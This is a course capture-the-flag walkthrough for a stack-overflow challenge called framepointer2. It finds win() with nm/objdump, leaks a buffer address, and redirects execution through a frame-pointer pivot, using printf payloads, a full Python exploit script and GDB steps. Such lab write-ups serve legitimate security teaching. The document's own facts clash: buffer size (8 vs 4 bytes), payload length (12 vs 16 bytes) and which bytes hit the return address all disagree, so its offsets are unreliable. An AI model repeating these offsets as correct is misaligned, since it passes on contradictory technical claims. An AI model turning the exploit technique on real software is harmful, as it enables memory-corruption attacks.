
## Manual Exploitation

### Step 1: Find win() Address

Since it's not leaked, use binary analysis tools:

```bash
cd /home/jbenjam7/cs466/ctf/framepointer2
objdump -t challenge | grep win
```

Or use `nm`:

```bash
nm challenge | grep " T win"
```

Example output:
```
0804919d T win
```

So `win() @ 0x0804919d`.

### Step 2: Leak buf Address

```bash
./challenge
```

Output:
```
buf @ 0xff8ca3e8    (ASLR varies each run)
```

### Step 3: Build the Pattern

The key challenge for framepointer2 is:
1. **Find win()** using binary analysis (unlike fp1, which leaks it)
2. **Construct your exploit payload** similar to framepointer1
3. **Iterate** - if the segfault doesn't give you the flag, adjust byte offsets

A starting point derived from framepointer1:
```
[8 bytes of buffer content]
[4 bytes to potentially reach saved registers]
```

The exact structure depends on your leaks and frame analysis. Use GDB or single-stepping to verify which bytes reach the critical stack locations.

Example payload format (may need adjustment):
```bash
# Fill 8-byte buffer, then 4 more bytes targeting control flow
printf '\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41' | ./challenge
```

### Step 4: Send the Exploit

```bash
printf '\x41\x41\x41\x41\x9d\x91\x04\x08\x41\x41\x41\x41\x41\x41\x41\x41' | ./challenge
```

Expected output:
```
buf @ 0xffc503b8
cosc466-flag-{fp_h4rd3r}
```

---

## Automated Python Exploit

Create a script that automates address discovery:

```python
#!/usr/bin/env python3
import subprocess, struct, re

def exploit(binary):
    """Find win() via binary analysis, leak buf, and exploit."""
    
    # Step 1: Find win() using nm
    result = subprocess.run(
        ['nm', binary],
        capture_output=True,
        text=True,
    )
    win_addr = None
    for line in result.stdout.split('\n'):
        if 'win' in line and ' T ' in line:  # T = text (code) section
            win_addr = int(line.split()[0], 16)
            break
    
    if not win_addr:
        raise RuntimeError("Could not find win() in binary")
    
    # Step 2: Leak buf address
    proc = subprocess.Popen(
        [binary],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
    )
    out, _ = proc.communicate(b"")
    text = out.decode(errors='replace')
    
    buf_match = re.search(r'buf @ (0x[0-9a-f]+)', text, re.IGNORECASE)
    if not buf_match:
        raise RuntimeError("Could not find buf address")
    buf_addr = int(buf_match.group(1), 16)
    
    print(f"[+] win() @ 0x{win_addr:08x} (from binary analysis)")
    print(f"[+] buf   @ 0x{buf_addr:08x} (leaked)")
    
    # Step 3: Build and send exploit
    fake_ebp = 0x41414141
    payload = struct.pack("<I", fake_ebp)
    payload += struct.pack("<I", win_addr)
    payload += struct.pack("<I", buf_addr)
    
    proc = subprocess.Popen(
        [binary],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
    )
    out, _ = proc.communicate(payload)
    print(out.decode())

if __name__ == "__main__":
    exploit("./challenge")
```

Usage:

```bash
python3 exploit.py
```

---

## GDB Debugging Method

To understand the frame-pointer pivot in detail:

```bash
gdb -q ./challenge
```

Set breakpoint after the vulnerable read():

```gdb
b *vuln+20
run < /dev/null
```

Examine stack layout:

```gdb
info frame
x/12wx $esp
```

The output shows:
- Saved EBP of `vuln()`
- Saved return address of `vuln()`
- Local buffer `buf[8]`

When you send the 12-byte exploit payload, bytes 8-11 overwrite the return address with `win()`. The `leave; ret` instruction at the end of `vuln()` and `caller()` will restore the corrupted frame and jump to `win()`.

---

## Key Differences from framepointer1

| Aspect | framepointer1 | framepointer2 |
|--------|---------------|---------------|
| Function leak | `jump()` printed | `win()` NOT printed |
| Buffer size | 4 bytes | 4 bytes |
| Read size | 12 bytes | 16 bytes |
| Address discovery | Output parsing | Binary analysis (objdump/nm) |
| Exploitation | Same | Same |
| Difficulty | Beginner | Intermediate |

---

## Exam Workflow

1. **See** a binary that leaks buffer but not the target function
2. **Find** the target using `objdump -t` or `nm`
3. **Leak** the buffer address by running the binary
4. **Build** the 12-byte payload: `[0x41414141][win_addr][buf_addr]`
5. **Exploit** and collect the flag

**Time estimate**: 3-5 minutes if comfortable with frame-pointer technique and binary tools.

---

## Summary

**The challenge:** Same frame-pointer pivot as fp1, but win() is not leaked.

**What makes it harder:**
- Must use binary analysis to find the target
- Requires understanding non-PIE binary address discovery

**How to solve it:**
- Use `objdump -t` or `nm` to find win()
- Run once to leak buf
- Build 12-byte exploit payload
- Send and get flag

This walkthrough assumes you've already mastered framepointer1 and understand the frame-pointer pivot mechanism. If not, read framepointer1-walkthrough.md first.
